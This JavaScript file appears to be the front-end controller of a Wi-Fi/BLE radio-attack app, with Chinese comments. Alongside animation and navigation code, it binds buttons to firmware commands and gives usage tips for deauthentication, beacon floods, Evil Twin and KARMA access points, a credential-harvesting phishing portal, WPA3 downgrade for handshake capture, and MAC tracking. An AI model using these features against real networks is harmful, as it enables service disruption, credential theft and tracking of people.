            r: Math.random()*1.4+0.4
        });
    }

    function tick(){
        if (!visible){ animId = null; return; }
        ctx.clearRect(0,0,W,H);
        for (let i=0; i<particles.length; i++){
            for (let j=i+1; j<particles.length; j++){
                const dx = particles[i].x-particles[j].x;
                const dy = particles[i].y-particles[j].y;
                const d = Math.sqrt(dx*dx+dy*dy);
                const maxD = 130*dpr;
                if (d < maxD){
                    ctx.strokeStyle = `rgba(234,242,255,${0.12*(1-d/maxD)})`;
                    ctx.lineWidth = 1;
                    ctx.beginPath();
                    ctx.moveTo(particles[i].x, particles[i].y);
                    ctx.lineTo(particles[j].x, particles[j].y);
                    ctx.stroke();
                }
            }
        }
        for (const p of particles){
            p.x += p.vx*dpr; p.y += p.vy*dpr;
            if (p.x<0||p.x>W) p.vx*=-1;
            if (p.y<0||p.y>H) p.vy*=-1;
            ctx.fillStyle = 'rgba(234,242,255,0.4)';
            ctx.beginPath();
            ctx.arc(p.x, p.y, p.r*dpr, 0, Math.PI*2);
            ctx.fill();
        }
        animId = requestAnimationFrame(tick);
    }
    tick();
})();

/* PWA service worker */
if ('serviceWorker' in navigator){
    navigator.serviceWorker.register('sw.js').catch(()=>{});
}

/*
   外壳交互层 (纯增量)
   - 左侧抽屉导航 (取代横排标签条, 解决"页面太长要上下翻")
   - 底部日志抽屉 (默认收起, 不占屏幕)
   - 仪表盘: 包速率环 + 迷你曲线 + 快捷动作
   - 列表卡片可折叠, 有内容时自动展开
   不改动任何既有命令 / 解析逻辑
 */
(function(){
    const $i = id => document.getElementById(id);
    const menu = $i('menu'), menuBtn = $i('menuBtn'), menuScrim = $i('menuScrim');
    const logSheet = $i('logSheet'), logHead = $i('logHead'), logBoxEl = $i('logBox');
    const stage = $i('stage');

    /* 抽屉导航 */
    function setMenu(open){
        menu.classList.toggle('open', open);
        menuBtn.setAttribute('aria-expanded', open ? 'true' : 'false');
    }
    menuBtn.addEventListener('click', () => setMenu(!menu.classList.contains('open')));
    menuScrim.addEventListener('click', () => setMenu(false));

    /* 导航项由 RFNav 生成并绑定, 这里只处理抽屉开关与搜索过滤 */
    const menuSearch = $i('menuSearch');
    menuSearch.addEventListener('input', () => {
        const q = menuSearch.value.trim().toLowerCase();
        document.querySelectorAll('#menuList .mi').forEach(mi => {
            const hay = ((mi.dataset.k || '') + ' ' + mi.textContent).toLowerCase();
            mi.classList.toggle('dim', !!q && !hay.includes(q));
        });
        document.querySelectorAll('#menuList .mgroup').forEach(g => {
            let n = g.nextElementSibling, visible = false;
            while (n && !n.classList.contains('mgroup')){
                if (n.classList.contains('mi') && !n.classList.contains('dim')) visible = true;
                n = n.nextElementSibling;
            }
            g.classList.toggle('dim', !visible);
        });
    });

    /* 切页时回到顶部 */
    document.querySelectorAll('.tab').forEach(t => {
        t.addEventListener('click', () => { stage.scrollTop = 0; });
    });

    /* 日志抽屉 */
    logHead.addEventListener('click', e => {
        if (e.target.closest('button')) return;
        logSheet.classList.toggle('open');
    });
    const logCountEl = $i('logCount');
    const refreshCount = () => { logCountEl.textContent = String(logBoxEl.children.length); };
    new MutationObserver(refreshCount).observe(logBoxEl, { childList:true });
    refreshCount();

    /* 列表卡片折叠 */
    document.querySelectorAll('.list-panel').forEach(p => {
        const head = p.querySelector('.list-head');
        if (head) head.addEventListener('click', () => p.classList.toggle('open'));
    });
    function autoOpen(panelId, bodyId){
        const p = $i(panelId), b = $i(bodyId);
        if (!p || !b) return;
        new MutationObserver(() => {
            if (b.querySelector('.list-item')) p.classList.add('open');
        }).observe(b, { childList:true });
    }
    autoOpen('apPanel',  'apList');
    autoOpen('cliPanel', 'cliList');
    autoOpen('credPanel','credList');

    /* 圆盘径向「发现」菜单 */
    const radial = $i('radial'), radialBtn = $i('radialBtn');
    const radialScrim = $i('radialScrim');
    const radialRing = document.querySelector('.radial-ring');
    const radialItems = Array.from(document.querySelectorAll('.radial-item'));

    /* 实时把「已发现数量」写进托盘徽标, 让托盘本身成为状态读数 */
    function updateRadialBadges(){
        const counts = { ap: apList.length, cli: clientList.length, ble: bleDevList.length };
        document.querySelectorAll('.radial-item .ri-badge').forEach(b => {
            const v = counts[b.dataset.badge];
            if (v === undefined) return;
            b.textContent = v > 99 ? '99+' : String(v);
            b.classList.toggle('live', v > 0);
        });
    }

    /* 计算半径 + 上半圆 180° 铺开, 并依按钮位置决定向上/向下展开 */
    function layoutRadial(){
        const n = radialItems.length;
        const sw = window.innerWidth, sh = window.innerHeight;
        const br = radialBtn.getBoundingClientRect();
        const openDown = (br.top + br.height / 2) < sh / 2;   /* 按钮在上半屏 -> 向下展开 */
        /* 半径取屏幕宽度比例并限幅, 确保扇面左右不越界 */
        const maxR = Math.min(sw / 2 - 54, 132);
        const RAD_R = Math.max(80, Math.min(maxR, 106));
        const startAng = openDown ? Math.PI : -Math.PI;   /* 始终 左 -> 右 */
        const endAng   = 0;
        radialItems.forEach((it, i) => {
            const t = n > 1 ? i / (n - 1) : 0.5;
            const ang = startAng + t * (endAng - startAng);
            it.style.setProperty('--dx', Math.round(Math.cos(ang) * RAD_R) + 'px');
            it.style.setProperty('--dy', Math.round(Math.sin(ang) * RAD_R) + 'px');
        });
        radialRing.style.setProperty('--ringFrom', (openDown ? 78 : -78) + 'deg');
    }
    layoutRadial();
    window.addEventListener('resize', layoutRadial);

    function setRadial(open){
        if (open) updateRadialBadges();
        radial.classList.toggle('open', open);
        radialBtn.classList.toggle('open', open);
        radialBtn.setAttribute('aria-expanded', open ? 'true' : 'false');
        if (open){
            document.getElementById('menu')?.classList.remove('open');
            $i('menuBtn')?.setAttribute('aria-expanded', 'false');
            /* stage 跟随按钮中心, 扇面从按钮处旋转扫出 */
            const r = radialBtn.getBoundingClientRect();
            const stage = $i('radialStage');
            if (stage){
                stage.style.left = (r.left + r.width / 2) + 'px';
                stage.style.bottom = 'auto';
                stage.style.top  = (r.top + r.height / 2) + 'px';
            }
            layoutRadial();
        }
        /* 轻触觉反馈, 让点按「有回应」 */
        if (navigator.vibrate){ try{ navigator.vibrate(open ? 9 : 5); }catch(_){/* ignore */} }
    }
    let suppressRadialClick = false;
    radialBtn.addEventListener('click', () => {
        if(suppressRadialClick){ suppressRadialClick = false; return; }
        setRadial(!radial.classList.contains('open'));
    });
    radialScrim.addEventListener('click', () => setRadial(false));

    /* radialBtn 拖放 (Pointer Events)
       旧实现把 touchmove 以 {passive:false} 挂在 window 上, 整页滚动都要等 JS,
       是「卡手」的根因. 改用 pointerdown + setPointerCapture, 只在按下的手指上
       派发 move, 空闲时不再有全局滚动拦截. */
    (function setupDrag(){
        let dragging = false, moved = false, pid = null;
        let startX = 0, startY = 0, origLeft = 0, origTop = 0;
        const btn = radialBtn;
        const STORE_KEY = 'radialBtnPos';
        const THRESH = 8;   /* 拖动判定阈值, 避免手抖把点按误判成拖动 */

        /* 恢复上次位置 */
        try{
            const saved = JSON.parse(localStorage.getItem(STORE_KEY) || 'null');
            if(saved && typeof saved.x === 'number' && typeof saved.y === 'number'){
                btn.style.right = 'auto';
                btn.style.bottom = 'auto';
                btn.style.left = saved.x + 'px';
                btn.style.top  = saved.y + 'px';
            }
        }catch(e){ /* ignore */ }

        function onDown(e){
            if(pid !== null) return;
            pid = e.pointerId;
            dragging = true; moved = false;
            startX = e.clientX; startY = e.clientY;
            const rect = btn.getBoundingClientRect();
            origLeft = rect.left; origTop = rect.top;
            btn.style.right = 'auto'; btn.style.bottom = 'auto';
            try{ btn.setPointerCapture(pid); }catch(err){ /* ignore */ }
            btn.classList.add('dragging');
            /* 按下不做 preventDefault / 不关菜单, 否则 click 会被吞 -> 点不开 */
        }
        function onMove(e){
            if(!dragging || e.pointerId !== pid) return;
            const dx = e.clientX - startX, dy = e.clientY - startY;
            if(!moved && (Math.abs(dx) > THRESH || Math.abs(dy) > THRESH)) moved = true;
            if(!moved) return;
            const bw = btn.offsetWidth, bh = btn.offsetHeight;
            let nx = origLeft + dx, ny = origTop + dy;
            nx = Math.max(8, Math.min(window.innerWidth - bw - 8, nx));
            ny = Math.max(8, Math.min(window.innerHeight - bh - 8, ny));
            btn.style.left = nx + 'px';
            btn.style.top  = ny + 'px';
            e.preventDefault();
        }
        function onEnd(e){
            if(!dragging || (pid !== null && e.pointerId !== pid)) return;
            dragging = false; pid = null;
            btn.classList.remove('dragging');
            if(moved){
                /* 拖动过: 抑制随之而来的 click, 并持久化新位置 */
                suppressRadialClick = true;
                try{
                    const rect = btn.getBoundingClientRect();
                    localStorage.setItem(STORE_KEY, JSON.stringify({x: rect.left, y: rect.top}));
                }catch(err){ /* ignore */ }
            }
        }
        btn.addEventListener('pointerdown', onDown);
        btn.addEventListener('pointermove', onMove);
        btn.addEventListener('pointerup', onEnd);
        btn.addEventListener('pointercancel', onEnd);
    })();

    radialItems.forEach(it => {
        it.addEventListener('click', () => {
            const act = it.dataset.rad;
            if (navigator.vibrate){ try{ navigator.vibrate(6); }catch(_){/* ignore */} }
            setRadial(false);
            if (act === 'scanap'){ gotoTab('scan'); scanAps(6); }
            else if (act === 'scancli'){ gotoTab('scan'); scanClients(8); }
            /* BLE 设备列表就在「扫描」页 (bledevList/bleCount2), 所以必须切到
             * scan 页. 之前误切到 adv 页, 结果扫到了却渲染在隐藏面板里,
             * 表现为「扫不出 / 没显示」. */
            else if (act === 'scanble'){ gotoTab('scan'); setTimeout(() => bleScanStart(), 260); }
            else if (act === 'openscan'){ gotoTab('scan'); }
            else if (act === 'stopall'){ stopAll(); }
        });
    });

    /* 仪表盘 */
    const meterEl = $i('dashMeter'), rateEl = $i('dashRate'), modeEl = $i('dashMode');
    const spark = $i('dashSpark');
    const hist = new Array(48).fill(0);
    let lastSniff = 0;

    const numOf = id => {
        const e = $i(id);
        if (!e) return 0;
        const n = parseInt(String(e.textContent).replace(/[^\d]/g, ''), 10);
        return isNaN(n) ? 0 : n;
    };
    const txtOf = id => { const e = $i(id); return e ? e.textContent.trim() : '--'; };

    const INK = 'rgba(234,242,255,';   /* 单色: 只用近白 + 透明度 */

    function drawSpark(){
        const w = spark.clientWidth || 240, h = 34;
        const dpr = Math.min(window.devicePixelRatio || 1, 2);
        if (spark.width !== Math.round(w*dpr) || spark.height !== Math.round(h*dpr)){
            spark.width = Math.round(w*dpr); spark.height = Math.round(h*dpr);
        }
        const ctx = spark.getContext('2d');
        ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
        ctx.clearRect(0, 0, w, h);

        const peak = Math.max(1, ...hist);
        const yOf = v => h - 3 - (v / peak) * (h - 10);
        const xOf = i => (i / (hist.length - 1)) * (w - 2) + 1;

        ctx.strokeStyle = 'rgba(232,241,255,.12)';
        ctx.lineWidth = 1;
        ctx.beginPath(); ctx.moveTo(0, h - .5); ctx.lineTo(w, h - .5); ctx.stroke();

        ctx.beginPath();
        hist.forEach((v, i) => { const x = xOf(i), y = yOf(v); i ? ctx.lineTo(x, y) : ctx.moveTo(x, y); });
        ctx.lineTo(w - 1, h); ctx.lineTo(1, h); ctx.closePath();
        ctx.fillStyle = INK + '.05)'; ctx.fill();

        ctx.beginPath();
        hist.forEach((v, i) => { const x = xOf(i), y = yOf(v); i ? ctx.lineTo(x, y) : ctx.moveTo(x, y); });
        ctx.strokeStyle = INK + '.85)';
        ctx.lineWidth = 1;
        ctx.lineJoin = 'round';
        ctx.stroke();

        ctx.beginPath();
        ctx.arc(xOf(hist.length - 1), yOf(hist[hist.length - 1]), 1.6, 0, Math.PI*2);
        ctx.fillStyle = '#eaf2ff'; ctx.fill();
    }

    function dashTick(){
        const cur = numOf('stSniff2');
        const pps = Math.max(0, cur - lastSniff);   /* 每秒新增包数 */
        lastSniff = cur;
        hist.push(pps); hist.shift();

        rateEl.textContent = pps >= 1000 ? (pps / 1000).toFixed(1) + 'k' : String(pps);
        const peak = Math.max(1, ...hist);
        meterEl.style.width = (Math.min(1, pps / peak) * 100).toFixed(1) + '%';

        const state = txtOf('stState') || 'IDLE';
        const active = state !== 'IDLE';
        modeEl.textContent = active ? state : '空闲';
        modeEl.style.color = active ? 'var(--accent)' : '';
        $i('dashCred').textContent = String(numOf('credCount'));

        drawSpark();

        const msg = $i('dashMsg');
        if (!connected){
            msg.textContent = '未连接板子。点上方「搜索板子」开始。';
        } else {
            msg.textContent = (active ? '作业进行中' : '空闲')
                + ' · 频段 ' + txtOf('stBand2') + ' · 信道 ' + txtOf('stCh2')
                + ' · 单射频：嗅探 / 注入 / 门户 三者互斥';
        }
    }
    setInterval(dashTick, 1000);
    window.addEventListener('resize', drawSpark, { passive:true });
    dashTick();

    /* 仪表盘快捷动作 -> 复用既有按钮 */
    [['dashBtnSniff','btnSniff'], ['dashBtnStop','btnStop'],
     ['dashBtnRefresh','btnResetStats']].forEach(([a, b]) => {
        const ea = $i(a), eb = $i(b);
        if (ea && eb) ea.addEventListener('click', () => eb.click());
    });
    /* 「扫描 AP」跳到扫描页再开扫, 否则扫完结果在别的标签页看不见 */
    const dScan = $i('dashBtnScanAp');
    if (dScan) dScan.addEventListener('click', () => { gotoTab('scan'); scanAps(6); });
})();


/*
   固件 2.1.0 新能力入口 — 场景编排 / 信号定位 / OTA
   这部分是「移植」: UI 保持 1.5.1 原样, 只把 2.x 固件新增的命令
   接到原版已有的 .blk / .actions / .field 结构上, 不引入新样式.
 */
(function(){
    const $id = id => document.getElementById(id);
    const bind = (id, cmd) => {
        const el = $id(id);
        if (el) el.addEventListener('click', () => sendCmd(cmd));
    };
    const val = id => { const el = $id(id); return el ? el.value.trim() : ''; };

    /* 场景编排 */
    bind('btnScSurvey', 'scenario survey 30');
    bind('btnScStop',   'scenario stop');

    const scHs = $id('btnScHs');
    if (scHs) scHs.addEventListener('click', () => {
        const b = val('scBssid');
        if (!b){ toast('先填目标 BSSID', 'warn'); return; }
        sendCmd('scenario handshake ' + b + ' 40');
    });
    const scPmf = $id('btnScPmf');
    if (scPmf) scPmf.addEventListener('click', () => {
        const b = val('scBssid');
        if (!b){ toast('先填目标 BSSID', 'warn'); return; }
        sendCmd('scenario pmf ' + b);
    });

    /* 信号定位 */
    const locStart = $id('btnLocStart');
    if (locStart) locStart.addEventListener('click', () => {
        const m = val('locMac');
        if (!m){ toast('先填目标 MAC', 'warn'); return; }
        sendCmd('locate ' + m + ' 30');
    });
    bind('btnLocStatus', 'locate status');
    bind('btnLocExport', 'locate export');
    bind('btnLocStop',   'locate stop');

    /* OTA 双区升级 */
    bind('btnOtaStatus',   'ota status');
    bind('btnOtaConfirm',  'ota confirm');
    bind('btnOtaRollback', 'ota rollback');
    bind('btnOtaReboot',   'ota reboot');
})();


/* 导航模型: 每个条目是一页, blks 是 panel 内 .blk 的下标.
   有前置关系的卡放同一页(嗅探+握手、探测+落盘), 其余一页一卡. */
const RF_NAV = [
  { g:'概览', items:[
    { k:'dash', tip:'第一次用：先点顶部「搜索板子」连上，再点目标条上的「扫描附近热点」。',
      lb:'仪表盘', d:'速率、状态、快捷入口', panel:'dash', blks:[0,1] },
  ]},
  { g:'目标', items:[
    { k:'scan', tip:'',
      lb:'扫描热点', d:'扫 2.4G+5G, 点一条即设为目标', panel:'scan', blks:[0,1] },
    { k:'clients', tip:'刚连上的设备帧数少，刷新两次再判断。',
      lb:'已连客户端', d:'被动收集, 可定向断开', panel:'scan', blks:[2] },
    { k:'blenear', tip:'',
      lb:'BLE 近邻', d:'板子自扫周围蓝牙设备', panel:'scan', blks:[3] },
  ]},
  { g:'嗅探', items:[
    { k:'sniff', tip:'握手计数一直是 0，先看「已连客户端」有没有人；没有客户端就不会有握手。',
      lb:'嗅探与握手', d:'抓帧, 自动归档可破解握手', panel:'sniff', blks:[0,1] },
    { k:'capture', tip:'',
      lb:'原始帧落盘', d:'写 Flash, 导出 pcap', panel:'sniff', blks:[2] },
  ]},
  { g:'注入', items:[
    { k:'deauth', tip:'目标必须先出现在扫描列表里。PMF 必需的 AP 会直接拒绝，改走降级或 Evil Twin。',
      lb:'Deauth 断开', d:'踢单个客户端或整台 AP', panel:'deauth', blks:[0] },
    { k:'beacon', tip:'SSID 会拼上序号。速率过高容易让客户端异常，先用小批量试。',
      lb:'Beacon 洪泛', d:'伪造大量热点', panel:'beacon', blks:[0] },
    { k:'probe', tip:'伪造客户端探测，用来试探附近有没有同名热点。',
      lb:'Probe 洪泛', d:'伪造客户端探测', panel:'probe', blks:[0] },
  ]},
  { g:'诱捕', items:[
    { k:'phish', tip:'',
      lb:'钓鱼门户', d:'同名热点加认证页, 收凭据', panel:'phish', blks:[0,1] },
    { k:'eviltwin', tip:'克隆后客户端要重新发起连接才会落到这里，配合 Deauth 推送更快见效。',
      lb:'Evil Twin', d:'复制 SSID 与 BSSID', panel:'adv', blks:[1] },
    { k:'karma', tip:'对任何探测请求都应答，适合找曾经连过某热点的设备。',
      lb:'KARMA', d:'响应任意探测请求', panel:'adv', blks:[2] },
    { k:'downgrade', tip:'只对 WPA3 过渡模式有效，纯 WPA3 的 AP 没有降级空间。',
      lb:'WPA3 降级', d:'逼出 WPA2 四次握手', panel:'downgrade', blks:[0] },
  ]},
  { g:'工具', items:[
    { k:'scenario', tip:'三个动作都会先自动扫一轮，再按有没有目标决定下一步。',
      lb:'一键编排', d:'勘察、抓握手、判 PMF', panel:'adv', blks:[0] },
    { k:'rawframe', tip:'十六进制裸帧，设备不做校验，填错不会有提示。',
      lb:'原始帧构造', d:'手写 802.11 帧并发送', panel:'adv', blks:[3] },
    { k:'bleadv', tip:'广播内容自己填。控制链还在，不影响 App 连接。',
      lb:'BLE 广播伪造', d:'iBeacon、Eddystone', panel:'tools', blks:[1] },
    { k:'ftm', tip:'',
      lb:'FTM 测距', d:'802.11mc 测真实距离', panel:'tools', blks:[2] },
    { k:'locate', tip:'采样时拿着设备走动，静止只会得到一条噪声曲线。',
      lb:'信号定位', d:'RSSI 采样与趋势', panel:'tools', blks:[3] },
    { k:'zb', tip:'802.15.4 与 BLE 广播争同一块内部 RAM，本版默认关闭。',
      lb:'802.15.4 嗅探', d:'Zigbee、Thread', panel:'tools', blks:[4] },
    { k:'blepwr', tip:'提高功率会增加功耗和发热，链路稳定后可以调回。',
      lb:'BLE 发射功率', d:'调控制链功率', panel:'tools', blks:[5] },
  ]},
  { g:'系统', items:[
    { k:'conn', tip:'GATT 与 MTU 在连接时协商，这里只显示链路层信息。',
      lb:'连接信息', d:'链路、固件版本', panel:'data', blks:[0] },
    { k:'snapshot', tip:'读的是设备端内存表，上限 256 个 AP、256 个客户端。',
      lb:'数据库快照', d:'AP、客户端、握手', panel:'data', blks:[1] },
    { k:'export', tip:'导出由设备端拼装，数据量大时先停掉嗅探。',
      lb:'导出', d:'JSON、CSV、pcap', panel:'data', blks:[2] },
    { k:'http', tip:'服务起在 192.168.71.1，先让手机连板子的热点。',
      lb:'板载 HTTP', d:'浏览器访问 /api', panel:'data', blks:[3] },
    { k:'ota', tip:'新镜像写进另一个分区，45 秒内不崩才确认，崩了由引导器回滚。',
      lb:'固件升级', d:'双分区, 可回滚', panel:'data', blks:[4] },
    { k:'diag', tip:'自检看堆、任务、模块状态。日志级别在 CLI 里改。',
      lb:'诊断', d:'自检与日志', panel:'data', blks:[5] },
    { k:'about', tip:'仓库里有固件、App 与版本说明。链接跳系统浏览器，连接不会断。',
      lb:'关于', d:'版本、作者、仓库', panel:'data', blks:[6] },
    { k:'cli', tip:'直接敲固件命令，输出原样回显。',
      lb:'CLI 控制台', d:'直接敲命令', panel:'raw', blks:[0] },
    { k:'cmds', tip:'点一行填进控制台，参数可以再改。标红的需要 --yes。',
      lb:'指令速查', d:'全部命令与用法', panel:'raw', blks:[1] },
  ]},
];

const RF_PAGES = RF_NAV.flatMap(g => g.items);
const RF_BY_KEY = Object.fromEntries(RF_PAGES.map(p => [p.k, p]));
let rfCur = null;

function rfOpen(key){
    const page = RF_BY_KEY[key] || RF_BY_KEY[RF_PAGES.find(p => p.panel === key)?.k] || RF_PAGES[0];
    if (!page) return;
    const pan = document.getElementById('pan-' + page.panel);
    if (!pan) return;

    const tab = document.querySelector('.tab[data-tab="' + page.panel + '"]');
    if (tab) tab.click();

    document.querySelectorAll('.panel').forEach(x => x.classList.remove('paged'));
    pan.classList.add('paged');
    const blks = Array.from(pan.children).filter(el => el.classList.contains('blk'));
    blks.forEach((b, i) => b.classList.toggle('on', page.blks.includes(i)));

    rfCur = page.k;
    const tip = document.getElementById('pgTip');
    if (tip){
        tip.textContent = page.tip || '';
        tip.style.display = page.tip ? '' : 'none';
    }
    document.querySelectorAll('#menuList .mi').forEach(mi =>
        mi.classList.toggle('active', mi.dataset.page === page.k));

    const stage = document.getElementById('stage');
    if (stage) stage.scrollTop = 0;
    document.getElementById('menu')?.classList.remove('open');
    document.getElementById('menuBtn')?.setAttribute('aria-expanded', 'false');
    if (navigator.vibrate){ try { navigator.vibrate(3); } catch(_){} }
}

function rfRenderMenu(){
    const box = document.getElementById('menuList');
    if (!box) return;
    box.innerHTML = RF_NAV.map(g =>
        '<div class="mgroup">' + g.g + '</div>' +
        g.items.map(it =>
            '<button type="button" class="mi" data-page="' + it.k + '" data-k="' +
            (g.g + ' ' + it.lb + ' ' + it.d).toLowerCase() + '">' +
            '<span class="ic"></span><span class="lb">' + it.lb + '<i>' + it.d + '</i></span>' +
            '</button>'
        ).join('')
    ).join('');
    box.querySelectorAll('.mi').forEach(mi =>
        mi.addEventListener('click', () => rfOpen(mi.dataset.page)));
}

/* 候选列表: 有数据就能点选, 不用背 BSSID */
function rfRefreshPicks(){
    const ap = apList || [];
    const sta = clientList || [];
    const mk = (arr, fn) => arr.map(fn).join('');
    const byRssi = [...ap].sort((a, b) => b.rssi - a.rssi);

    const dlAp = document.getElementById('dlAp');
    if (dlAp) dlAp.innerHTML = mk(byRssi, a =>
        `<option value="${a.bssid}">${a.ssid} · CH${a.channel} · ${a.rssi}dBm</option>`);

    const dlSsid = document.getElementById('dlSsid');
    if (dlSsid) dlSsid.innerHTML = mk(
        [...new Set(byRssi.map(a => a.ssid).filter(x => x && x !== '(hidden)'))],
        x => `<option value="${x}"></option>`);

    const dlSta = document.getElementById('dlSta');
    if (dlSta) dlSta.innerHTML = mk(sta, c =>
        `<option value="${c.mac}">${c.vendor} · ${c.rssi}dBm</option>`);

    const dlMac = document.getElementById('dlMac');
    if (dlMac) dlMac.innerHTML =
        mk(byRssi, a => `<option value="${a.bssid}">${a.ssid} (AP)</option>`) +
        mk(sta, c => `<option value="${c.mac}">${c.vendor} (客户端)</option>`);

    if (typeof renderFtmApSelect === 'function') renderFtmApSelect();
}

function rfSyncTarget(){
    const bar = document.getElementById('tgtBar');
    const name = document.getElementById('tgtName');
    const meta = document.getElementById('tgtMeta');
    if (!bar || !name || !meta) return;
    const ap = selectedAp;
    const cli = selectedClient;
    if (ap){
        bar.classList.remove('empty');
        name.textContent = ap.ssid || '(隐藏)';
        meta.textContent = [ap.bssid, 'CH' + ap.channel, ap.rssi + 'dBm', ap.pmf ? 'PMF' : '']
            .filter(Boolean).join(' · ');
        document.getElementById('tgtScan').textContent = '扫描';
        document.getElementById('tgtChange').textContent = '更换';
    } else if (cli){
        bar.classList.remove('empty');
        name.textContent = '客户端 ' + cli.mac.slice(-8);
        meta.textContent = cli.vendor + ' · ' + cli.rssi + 'dBm';
        document.getElementById('tgtScan').textContent = '扫描';
        document.getElementById('tgtChange').textContent = '更换';
    } else {
        bar.classList.add('empty');
        name.textContent = '未选择';
        meta.textContent = '';
        document.getElementById('tgtScan').textContent = '扫描附近热点';
    }
}

window.RFNav = { open: rfOpen, pages: RF_PAGES, current: () => rfCur };
window.RFRefreshPicks = rfRefreshPicks;
window.RFSyncTarget = rfSyncTarget;

/* 旧入口 gotoTab 仍可能被调用(快捷按钮/扫描完成), 统一走分页 */
window.gotoTab = function(name){ rfOpen(name); };

(function(){
    rfRenderMenu();
    document.getElementById('tgtScan')?.addEventListener('click', () => {
        rfOpen('scan');
        document.getElementById('btnScanApFast')?.click();
    });
    document.getElementById('tgtChange')?.addEventListener('click', () => rfOpen('scan'));
    rfOpen('dash');
    rfSyncTarget();
    rfRefreshPicks();
    renderCliRef('');
})();
